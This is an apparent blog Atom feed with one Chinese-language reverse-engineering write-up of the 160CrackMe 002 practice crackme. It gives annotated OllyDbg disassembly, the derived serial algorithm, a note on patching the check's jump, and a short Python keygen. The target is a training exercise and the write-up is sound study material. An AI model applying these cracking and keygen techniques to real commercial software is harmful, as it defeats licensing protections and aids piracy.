<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Akkuman Blog</title>
  <subtitle>Python &amp; Hacker</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://akkuman.coding.me/"/>
  <updated>2017-09-16T06:31:11.717Z</updated>
  <id>http://akkuman.coding.me/</id>
  
  <author>
    <name>Akkuman</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>160CrackMe练手 002</title>
    <link href="http://akkuman.coding.me/2017/09/16/160CrackMe-002.html"/>
    <id>http://akkuman.coding.me/2017/09/16/160CrackMe-002.html</id>
    <published>2017-09-16T06:29:51.000Z</published>
    <updated>2017-09-16T06:31:11.717Z</updated>
    
    <content type="html"><![CDATA[<p>首先查壳无壳，输入伪码报错，根据报错od查找字符串，定位到错误代码附近，可以看到有个条件跳转，改掉就可以爆破，接下来分析下注册算法，我们周围看看，从最近几个call看，并没有我们输入的用户名在堆栈中出现，那我们直接从这个函数开头往下找，一般一个函数开头是push ebp一段代码用来提升堆栈，找到后我们往下找，注意堆栈，直到我们输入的字符出现，开始细心往下跟  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div></pre></td><td class="code"><pre><div class="line">00402310   &gt; \55            push ebp</div><div class="line">00402311   .  8BEC          mov ebp,esp</div><div class="line">00402313   .  83EC 0C       sub esp,0xC</div><div class="line">00402316   .  68 26104000   push &lt;jmp.&amp;MSVBVM50.__vbaExceptHandler&gt;  ;  SE 处理程序安装</div><div class="line">0040231B   .  64:A1 0000000&gt;mov eax,dword ptr fs:[0]</div><div class="line">00402321   .  50            push eax                                 ;  Afkayas_.00402191</div><div class="line">00402322   .  64:8925 00000&gt;mov dword ptr fs:[0],esp</div><div class="line">00402329   .  81EC B0000000 sub esp,0xB0</div><div class="line">0040232F   .  53            push ebx</div><div class="line">00402330   .  56            push esi</div><div class="line">00402331   .  8B75 08       mov esi,dword ptr ss:[ebp+0x8]           ;  esi -&gt; ASCII &quot;2@&quot;</div><div class="line">00402334   .  57            push edi</div><div class="line">00402335   .  8BC6          mov eax,esi                              ;  eax -&gt; ASCII &quot;2@&quot;</div><div class="line">00402337   .  83E6 FE       and esi,-0x2</div><div class="line">0040233A   .  8965 F4       mov dword ptr ss:[ebp-0xC],esp</div><div class="line">0040233D   .  83E0 01       and eax,0x1</div><div class="line">00402340   .  8B1E          mov ebx,dword ptr ds:[esi]</div><div class="line">00402342   .  C745 F8 08104&gt;mov dword ptr ss:[ebp-0x8],Afkayas_.0040&gt;</div><div class="line">00402349   .  56            push esi</div><div class="line">0040234A   .  8945 FC       mov dword ptr ss:[ebp-0x4],eax           ;  Afkayas_.00402191</div><div class="line">0040234D   .  8975 08       mov dword ptr ss:[ebp+0x8],esi</div><div class="line">00402350   .  FF53 04       call dword ptr ds:[ebx+0x4]              ;  msvbvm50.7404C5C8</div><div class="line">00402353   .  8B83 10030000 mov eax,dword ptr ds:[ebx+0x310]</div><div class="line">00402359   .  33FF          xor edi,edi</div><div class="line">0040235B   .  56            push esi</div><div class="line">0040235C   .  897D E8       mov dword ptr ss:[ebp-0x18],edi</div><div class="line">0040235F   .  897D E4       mov dword ptr ss:[ebp-0x1C],edi</div><div class="line">00402362   .  897D E0       mov dword ptr ss:[ebp-0x20],edi</div><div class="line">00402365   .  897D DC       mov dword ptr ss:[ebp-0x24],edi</div><div class="line">00402368   .  897D D8       mov dword ptr ss:[ebp-0x28],edi</div><div class="line">0040236B   .  897D D4       mov dword ptr ss:[ebp-0x2C],edi</div><div class="line">0040236E   .  897D C4       mov dword ptr ss:[ebp-0x3C],edi</div><div class="line">00402371   .  897D B4       mov dword ptr ss:[ebp-0x4C],edi</div><div class="line">00402374   .  897D A4       mov dword ptr ss:[ebp-0x5C],edi</div><div class="line">00402377   .  897D 94       mov dword ptr ss:[ebp-0x6C],edi</div><div class="line">0040237A   .  8985 40FFFFFF mov dword ptr ss:[ebp-0xC0],eax          ;  Afkayas_.00402191</div><div class="line">00402380   .  FFD0          call eax                                 ;  Afkayas_.00402191</div><div class="line">00402382   .  8D4D D4       lea ecx,dword ptr ss:[ebp-0x2C]</div><div class="line">00402385   .  50            push eax                                 ;  Afkayas_.00402191</div><div class="line">00402386   .  51            push ecx</div><div class="line">00402387   .  FF15 0C414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaObjSe&gt;;  msvbvm50.__vbaObjSet</div><div class="line">0040238D   .  8B9B 00030000 mov ebx,dword ptr ds:[ebx+0x300]</div><div class="line">00402393   .  56            push esi</div><div class="line">00402394   .  8985 50FFFFFF mov dword ptr ss:[ebp-0xB0],eax          ;  Afkayas_.00402191</div><div class="line">0040239A   .  899D 3CFFFFFF mov dword ptr ss:[ebp-0xC4],ebx</div><div class="line">004023A0   .  FFD3          call ebx</div><div class="line">004023A2   .  8D55 DC       lea edx,dword ptr ss:[ebp-0x24]</div><div class="line">004023A5   .  50            push eax                                 ;  Afkayas_.00402191</div><div class="line">004023A6   .  52            push edx</div><div class="line">004023A7   .  FF15 0C414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaObjSe&gt;;  msvbvm50.__vbaObjSet</div><div class="line">004023AD   .  8BD8          mov ebx,eax                              ;  Afkayas_.00402191</div><div class="line">004023AF   .  8D4D E8       lea ecx,dword ptr ss:[ebp-0x18]</div><div class="line">004023B2   .  51            push ecx</div><div class="line">004023B3   .  53            push ebx</div><div class="line">004023B4   .  8B03          mov eax,dword ptr ds:[ebx]</div><div class="line">004023B6   .  FF90 A0000000 call dword ptr ds:[eax+0xA0]</div><div class="line">004023BC   .  3BC7          cmp eax,edi</div><div class="line">004023BE   .  7D 12         jge short Afkayas_.004023D2</div><div class="line">004023C0   .  68 A0000000   push 0xA0</div><div class="line">004023C5   .  68 5C1B4000   push Afkayas_.00401B5C</div><div class="line">004023CA   .  53            push ebx</div><div class="line">004023CB   .  50            push eax                                 ;  Afkayas_.00402191</div><div class="line">004023CC   .  FF15 04414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaHresu&gt;;  msvbvm50.__vbaHresultCheckObj</div><div class="line">004023D2   &gt;  56            push esi</div><div class="line">004023D3   .  FF95 3CFFFFFF call dword ptr ss:[ebp-0xC4]</div><div class="line">004023D9   .  8D55 D8       lea edx,dword ptr ss:[ebp-0x28]</div><div class="line">004023DC   .  50            push eax                                 ;  Afkayas_.00402191</div><div class="line">004023DD   .  52            push edx</div><div class="line">004023DE   .  FF15 0C414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaObjSe&gt;;  msvbvm50.__vbaObjSet</div><div class="line">004023E4   .  8BD8          mov ebx,eax                              ;  Afkayas_.00402191</div><div class="line">004023E6   .  8D4D E4       lea ecx,dword ptr ss:[ebp-0x1C]</div><div class="line">004023E9   .  51            push ecx</div><div class="line">004023EA   .  53            push ebx</div><div class="line">004023EB   .  8B03          mov eax,dword ptr ds:[ebx]</div><div class="line">004023ED   .  FF90 A0000000 call dword ptr ds:[eax+0xA0]</div><div class="line">004023F3   .  3BC7          cmp eax,edi</div><div class="line">004023F5   .  7D 12         jge short Afkayas_.00402409</div><div class="line">004023F7   .  68 A0000000   push 0xA0</div><div class="line">004023FC   .  68 5C1B4000   push Afkayas_.00401B5C</div><div class="line">00402401   .  53            push ebx</div><div class="line">00402402   .  50            push eax                                 ;  Afkayas_.00402191</div><div class="line">00402403   .  FF15 04414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaHresu&gt;;  msvbvm50.__vbaHresultCheckObj</div><div class="line">00402409   &gt;  8B95 50FFFFFF mov edx,dword ptr ss:[ebp-0xB0]</div><div class="line">0040240F   .  8B45 E4       mov eax,dword ptr ss:[ebp-0x1C]          ;  用户名 -&gt; eax</div><div class="line">00402412   .  50            push eax                                 ; /用户名 -&gt; 堆栈</div><div class="line">00402413   .  8B1A          mov ebx,dword ptr ds:[edx]               ; |</div><div class="line">00402415   .  FF15 E4404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaLenBs&gt;; \len(用户名) -&gt; eax</div><div class="line">0040241B   .  8BF8          mov edi,eax                              ;  len(用户名) -&gt; edi</div><div class="line">0040241D   .  8B4D E8       mov ecx,dword ptr ss:[ebp-0x18]          ;  用户名 -&gt; ecx</div><div class="line">00402420   .  69FF FB7C0100 imul edi,edi,0x17CFB                     ;  len(用户名) * 0x17CFB ==&gt; edi=A6ADD</div><div class="line">00402426   .  51            push ecx                                 ; /String = NULL</div><div class="line">00402427   .  0F80 91020000 jo Afkayas_.004026BE                     ; |</div><div class="line">0040242D   .  FF15 F8404000 call dword ptr ds:[&lt;&amp;MSVBVM50.#rtcAnsiVa&gt;; \用户名去掉首字母 -&gt; edx</div><div class="line">00402433   .  0FBFD0        movsx edx,ax</div><div class="line">00402436   .  03FA          add edi,edx</div><div class="line">00402438   .  0F80 80020000 jo Afkayas_.004026BE</div><div class="line">0040243E   .  57            push edi                                 ;  len(用户名) * 0x17CFB 入栈-&gt; ebp-D4</div><div class="line">0040243F   .  FF15 E0404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrI4&gt;;  十进制(len(用户名) * 0x17CFB) + 首字母十进制ascii值  -&gt; eax</div><div class="line">00402445   .  8BD0          mov edx,eax                              ;  Afkayas_.00402191</div><div class="line">00402447   .  8D4D E0       lea ecx,dword ptr ss:[ebp-0x20]</div><div class="line">0040244A   .  FF15 70414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrMo&gt;;  msvbvm50.__vbaStrMove</div><div class="line">00402450   .  8BBD 50FFFFFF mov edi,dword ptr ss:[ebp-0xB0]</div><div class="line">00402456   .  50            push eax                                 ;  Afkayas_.00402191</div><div class="line">00402457   .  57            push edi                                 ;  十进制(len(用户名) * 0x17CFB) + 首字母十进制ascii值  入栈  -&gt; ebp-D4</div><div class="line">00402458   .  FF93 A4000000 call dword ptr ds:[ebx+0xA4]</div><div class="line">0040245E   .  85C0          test eax,eax                             ;  Afkayas_.00402191</div><div class="line">00402460   .  7D 12         jge short Afkayas_.00402474</div><div class="line">00402462   .  68 A4000000   push 0xA4</div><div class="line">00402467   .  68 5C1B4000   push Afkayas_.00401B5C</div><div class="line">0040246C   .  57            push edi</div><div class="line">0040246D   .  50            push eax                                 ;  Afkayas_.00402191</div><div class="line">0040246E   .  FF15 04414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaHresu&gt;;  msvbvm50.__vbaHresultCheckObj</div><div class="line">00402474   &gt;  8D45 E0       lea eax,dword ptr ss:[ebp-0x20]</div><div class="line">00402477   .  8D4D E4       lea ecx,dword ptr ss:[ebp-0x1C]</div><div class="line">0040247A   .  50            push eax                                 ;  Afkayas_.00402191</div><div class="line">0040247B   .  8D55 E8       lea edx,dword ptr ss:[ebp-0x18]</div><div class="line">0040247E   .  51            push ecx</div><div class="line">0040247F   .  52            push edx</div><div class="line">00402480   .  6A 03         push 0x3</div><div class="line">00402482   .  FF15 5C414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFreeS&gt;;  msvbvm50.__vbaFreeStrList</div><div class="line">00402488   .  83C4 10       add esp,0x10</div><div class="line">0040248B   .  8D45 D4       lea eax,dword ptr ss:[ebp-0x2C]</div><div class="line">0040248E   .  8D4D D8       lea ecx,dword ptr ss:[ebp-0x28]</div><div class="line">00402491   .  8D55 DC       lea edx,dword ptr ss:[ebp-0x24]</div><div class="line">00402494   .  50            push eax                                 ;  Afkayas_.00402191</div><div class="line">00402495   .  51            push ecx</div><div class="line">00402496   .  52            push edx</div><div class="line">00402497   .  6A 03         push 0x3</div><div class="line">00402499   .  FF15 F4404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFreeO&gt;;  msvbvm50.__vbaFreeObjList</div><div class="line">0040249F   .  8B06          mov eax,dword ptr ds:[esi]</div><div class="line">004024A1   .  83C4 10       add esp,0x10</div><div class="line">004024A4   .  56            push esi</div><div class="line">004024A5   .  FF90 04030000 call dword ptr ds:[eax+0x304]</div><div class="line">004024AB   .  8B1D 0C414000 mov ebx,dword ptr ds:[&lt;&amp;MSVBVM50.__vbaOb&gt;;  msvbvm50.__vbaObjSet</div><div class="line">004024B1   .  50            push eax                                 ;  Afkayas_.00402191</div><div class="line">004024B2   .  8D45 DC       lea eax,dword ptr ss:[ebp-0x24]</div><div class="line">004024B5   .  50            push eax                                 ;  Afkayas_.00402191</div><div class="line">004024B6   .  FFD3          call ebx                                 ;  &lt;&amp;MSVBVM50.__vbaObjSet&gt;</div><div class="line">004024B8   .  8BF8          mov edi,eax                              ;  Afkayas_.00402191</div><div class="line">004024BA   .  8D55 E8       lea edx,dword ptr ss:[ebp-0x18]</div><div class="line">004024BD   .  52            push edx</div><div class="line">004024BE   .  57            push edi</div><div class="line">004024BF   .  8B0F          mov ecx,dword ptr ds:[edi]</div><div class="line">004024C1   .  FF91 A0000000 call dword ptr ds:[ecx+0xA0]</div><div class="line">004024C7   .  85C0          test eax,eax                             ;  Afkayas_.00402191</div><div class="line">004024C9   .  7D 12         jge short Afkayas_.004024DD</div><div class="line">004024CB   .  68 A0000000   push 0xA0</div><div class="line">004024D0   .  68 5C1B4000   push Afkayas_.00401B5C</div><div class="line">004024D5   .  57            push edi</div><div class="line">004024D6   .  50            push eax                                 ;  Afkayas_.00402191</div><div class="line">004024D7   .  FF15 04414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaHresu&gt;;  msvbvm50.__vbaHresultCheckObj</div><div class="line">004024DD   &gt;  56            push esi</div><div class="line">004024DE   .  FF95 40FFFFFF call dword ptr ss:[ebp-0xC0]</div><div class="line">004024E4   .  50            push eax                                 ;  Afkayas_.00402191</div><div class="line">004024E5   .  8D45 D8       lea eax,dword ptr ss:[ebp-0x28]</div><div class="line">004024E8   .  50            push eax                                 ;  Afkayas_.00402191</div><div class="line">004024E9   .  FFD3          call ebx</div><div class="line">004024EB   .  8BF0          mov esi,eax                              ;  Afkayas_.00402191</div><div class="line">004024ED   .  8D55 E4       lea edx,dword ptr ss:[ebp-0x1C]</div><div class="line">004024F0   .  52            push edx</div><div class="line">004024F1   .  56            push esi</div><div class="line">004024F2   .  8B0E          mov ecx,dword ptr ds:[esi]</div><div class="line">004024F4   .  FF91 A0000000 call dword ptr ds:[ecx+0xA0]</div><div class="line">004024FA   .  85C0          test eax,eax                             ;  Afkayas_.00402191</div><div class="line">004024FC   .  7D 12         jge short Afkayas_.00402510</div><div class="line">004024FE   .  68 A0000000   push 0xA0</div><div class="line">00402503   .  68 5C1B4000   push Afkayas_.00401B5C</div><div class="line">00402508   .  56            push esi</div><div class="line">00402509   .  50            push eax                                 ;  Afkayas_.00402191</div><div class="line">0040250A   .  FF15 04414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaHresu&gt;;  msvbvm50.__vbaHresultCheckObj</div><div class="line">00402510   &gt;  8B45 E8       mov eax,dword ptr ss:[ebp-0x18]          ;  user32.77D2BBF7</div><div class="line">00402513   .  8B4D E4       mov ecx,dword ptr ss:[ebp-0x1C]</div><div class="line">00402516   .  8B3D 00414000 mov edi,dword ptr ds:[&lt;&amp;MSVBVM50.__vbaSt&gt;;  十进制(len(用户名) * 0x17CFB) + 首字母十进制ascii值 -&gt; ecx       密码 -&gt; eax</div><div class="line">0040251C   .  50            push eax                                 ;  Afkayas_.00402191</div><div class="line">0040251D   .  68 701B4000   push Afkayas_.00401B70                   ;  &quot;AKA-&quot;入栈</div><div class="line">00402522   .  51            push ecx                                 ; /十进制(len(用户名) * 0x17CFB) + 首字母十进制ascii值 入栈</div><div class="line">00402523   .  FFD7          call edi                                 ; \&quot;AKA-&quot;+&quot;十进制(len(用户名) * 0x17CFB) + 首字母十进制ascii值&quot;   -&gt;  eax</div><div class="line">00402525   .  8B1D 70414000 mov ebx,dword ptr ds:[&lt;&amp;MSVBVM50.__vbaSt&gt;;  msvbvm50.__vbaStrMove</div><div class="line">0040252B   .  8BD0          mov edx,eax                              ;  Afkayas_.00402191</div><div class="line">0040252D   .  8D4D E0       lea ecx,dword ptr ss:[ebp-0x20]</div><div class="line">00402530   .  FFD3          call ebx                                 ;  &lt;&amp;MSVBVM50.__vbaStrMove&gt;</div><div class="line">00402532   .  50            push eax                                 ;  Afkayas_.00402191</div><div class="line">00402533   .  FF15 28414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrCm&gt;;  msvbvm50.__vbaStrCmp</div><div class="line">00402539   .  8BF0          mov esi,eax                              ;  Afkayas_.00402191</div><div class="line">0040253B   .  8D55 E0       lea edx,dword ptr ss:[ebp-0x20]</div><div class="line">0040253E   .  F7DE          neg esi</div><div class="line">00402540   .  8D45 E8       lea eax,dword ptr ss:[ebp-0x18]</div><div class="line">00402543   .  52            push edx</div><div class="line">00402544   .  1BF6          sbb esi,esi</div><div class="line">00402546   .  8D4D E4       lea ecx,dword ptr ss:[ebp-0x1C]</div><div class="line">00402549   .  50            push eax                                 ;  Afkayas_.00402191</div><div class="line">0040254A   .  46            inc esi</div><div class="line">0040254B   .  51            push ecx</div><div class="line">0040254C   .  6A 03         push 0x3</div><div class="line">0040254E   .  F7DE          neg esi</div><div class="line">00402550   .  FF15 5C414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFreeS&gt;;  msvbvm50.__vbaFreeStrList</div><div class="line">00402556   .  83C4 10       add esp,0x10</div><div class="line">00402559   .  8D55 D8       lea edx,dword ptr ss:[ebp-0x28]</div><div class="line">0040255C   .  8D45 DC       lea eax,dword ptr ss:[ebp-0x24]</div><div class="line">0040255F   .  52            push edx</div><div class="line">00402560   .  50            push eax                                 ;  Afkayas_.00402191</div><div class="line">00402561   .  6A 02         push 0x2</div><div class="line">00402563   .  FF15 F4404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFreeO&gt;;  msvbvm50.__vbaFreeObjList</div><div class="line">00402569   .  83C4 0C       add esp,0xC</div><div class="line">0040256C   .  B9 04000280   mov ecx,0x80020004</div><div class="line">00402571   .  B8 0A000000   mov eax,0xA</div><div class="line">00402576   .  894D 9C       mov dword ptr ss:[ebp-0x64],ecx</div><div class="line">00402579   .  66:85F6       test si,si</div><div class="line">0040257C   .  8945 94       mov dword ptr ss:[ebp-0x6C],eax          ;  Afkayas_.00402191</div><div class="line">0040257F   .  894D AC       mov dword ptr ss:[ebp-0x54],ecx</div><div class="line">00402582   .  8945 A4       mov dword ptr ss:[ebp-0x5C],eax          ;  Afkayas_.00402191</div><div class="line">00402585   .  894D BC       mov dword ptr ss:[ebp-0x44],ecx</div><div class="line">00402588   .  8945 B4       mov dword ptr ss:[ebp-0x4C],eax          ;  Afkayas_.00402191</div><div class="line">0040258B   .  74 58         je short Afkayas_.004025E5</div><div class="line">0040258D   .  68 801B4000   push Afkayas_.00401B80                   ;  You Get It</div><div class="line">00402592   .  68 9C1B4000   push Afkayas_.00401B9C                   ;  \r\n</div><div class="line">00402597   .  FFD7          call edi</div><div class="line">00402599   .  8BD0          mov edx,eax                              ;  Afkayas_.00402191</div><div class="line">0040259B   .  8D4D E8       lea ecx,dword ptr ss:[ebp-0x18]</div><div class="line">0040259E   .  FFD3          call ebx</div><div class="line">004025A0   .  50            push eax                                 ;  Afkayas_.00402191</div><div class="line">004025A1   .  68 A81B4000   push Afkayas_.00401BA8                   ;  KeyGen It Now</div><div class="line">004025A6   .  FFD7          call edi</div><div class="line">004025A8   .  8D4D 94       lea ecx,dword ptr ss:[ebp-0x6C]</div><div class="line">004025AB   .  8945 CC       mov dword ptr ss:[ebp-0x34],eax          ;  Afkayas_.00402191</div><div class="line">004025AE   .  8D55 A4       lea edx,dword ptr ss:[ebp-0x5C]</div><div class="line">004025B1   .  51            push ecx</div><div class="line">004025B2   .  8D45 B4       lea eax,dword ptr ss:[ebp-0x4C]</div><div class="line">004025B5   .  52            push edx</div><div class="line">004025B6   .  50            push eax                                 ;  Afkayas_.00402191</div><div class="line">004025B7   .  8D4D C4       lea ecx,dword ptr ss:[ebp-0x3C]</div><div class="line">004025BA   .  6A 00         push 0x0</div><div class="line">004025BC   .  51            push ecx</div><div class="line">004025BD   .  C745 C4 08000&gt;mov dword ptr ss:[ebp-0x3C],0x8</div><div class="line">004025C4   .  FF15 10414000 call dword ptr ds:[&lt;&amp;MSVBVM50.#rtcMsgBox&gt;;  msvbvm50.rtcMsgBox</div><div class="line">004025CA   .  8D4D E8       lea ecx,dword ptr ss:[ebp-0x18]</div><div class="line">004025CD   .  FF15 80414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFreeS&gt;;  msvbvm50.__vbaFreeStr</div><div class="line">004025D3   .  8D55 94       lea edx,dword ptr ss:[ebp-0x6C]</div><div class="line">004025D6   .  8D45 A4       lea eax,dword ptr ss:[ebp-0x5C]</div><div class="line">004025D9   .  52            push edx</div><div class="line">004025DA   .  8D4D B4       lea ecx,dword ptr ss:[ebp-0x4C]</div><div class="line">004025DD   .  50            push eax                                 ;  Afkayas_.00402191</div><div class="line">004025DE   .  8D55 C4       lea edx,dword ptr ss:[ebp-0x3C]</div><div class="line">004025E1   .  51            push ecx</div><div class="line">004025E2   .  52            push edx</div><div class="line">004025E3   .  EB 56         jmp short Afkayas_.0040263B</div><div class="line">004025E5   &gt;  68 C81B4000   push Afkayas_.00401BC8                   ;  You Get Wrong</div><div class="line">004025EA   .  68 9C1B4000   push Afkayas_.00401B9C                   ;  \r\n</div><div class="line">004025EF   .  FFD7          call edi</div><div class="line">004025F1   .  8BD0          mov edx,eax                              ;  Afkayas_.00402191</div><div class="line">004025F3   .  8D4D E8       lea ecx,dword ptr ss:[ebp-0x18]</div><div class="line">004025F6   .  FFD3          call ebx</div><div class="line">004025F8   .  50            push eax                                 ;  Afkayas_.00402191</div><div class="line">004025F9   .  68 E81B4000   push Afkayas_.00401BE8                   ;  Try Again</div></pre></td></tr></table></figure>
<p>通过分析可以看到加密关键代码是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">0040240F   .  8B45 E4       mov eax,dword ptr ss:[ebp-0x1C]          ;  用户名 -&gt; eax</div><div class="line">00402412   .  50            push eax                                 ; /用户名 -&gt; 堆栈</div><div class="line">00402413   .  8B1A          mov ebx,dword ptr ds:[edx]               ; |</div><div class="line">00402415   .  FF15 E4404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaLenBs&gt;; \len(用户名) -&gt; eax</div><div class="line">0040241B   .  8BF8          mov edi,eax                              ;  len(用户名) -&gt; edi</div><div class="line">0040241D   .  8B4D E8       mov ecx,dword ptr ss:[ebp-0x18]          ;  用户名 -&gt; ecx</div><div class="line">00402420   .  69FF FB7C0100 imul edi,edi,0x17CFB                     ;  len(用户名) * 0x17CFB ==&gt; edi=A6ADD</div><div class="line">00402426   .  51            push ecx                                 ; /String = NULL</div><div class="line">00402427   .  0F80 91020000 jo Afkayas_.004026BE                     ; |</div><div class="line">0040242D   .  FF15 F8404000 call dword ptr ds:[&lt;&amp;MSVBVM50.#rtcAnsiVa&gt;; \用户名去掉首字母 -&gt; edx</div><div class="line">0040243E   .  57            push edi                                 ;  len(用户名) * 0x17CFB 入栈-&gt; ebp-D4</div><div class="line">0040243F   .  FF15 E0404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrI4&gt;;  十进制(len(用户名) * 0x17CFB) + 首字母十进制ascii值  -&gt; eax</div><div class="line">0040251D   .  68 701B4000   push Afkayas_.00401B70                   ;  &quot;AKA-&quot;入栈</div><div class="line">00402522   .  51            push ecx                                 ; /十进制(len(用户名) * 0x17CFB) + 首字母十进制ascii值 入栈</div><div class="line">00402523   .  FFD7          call edi                                 ; \&quot;AKA-&quot;+&quot;十进制(len(用户名) * 0x17CFB) + 首字母十进制ascii值&quot;   -&gt;  eax</div></pre></td></tr></table></figure></p>
<p>可以看出流程就是 “AKA-“+”十进制(len(用户名) * 0x17CFB) + 首字母十进制ascii值”  </p>
<p>写注册机（Python）<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line">username = sys.argv[<span class="number">1</span>]</div><div class="line">pwend = len(username) * <span class="number">0x17CFB</span> + ord(username[<span class="number">0</span>])</div><div class="line">password = <span class="string">"AKA-%d"</span>%pwend</div><div class="line">print(password)</div></pre></td></tr></table></figure></p>
<p>测试结果<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">C:\Users\Administrator\Desktop&gt;python 1.py akkuman</div><div class="line">AKA-682814</div></pre></td></tr></table></figure></p>
<p><img src="http://ww1.sinaimg.cn/large/c0264382gy1fjle318xy9j20ir0abgu6.jpg" alt=""></p>
]]></content>
    
    <summary type="html">
    
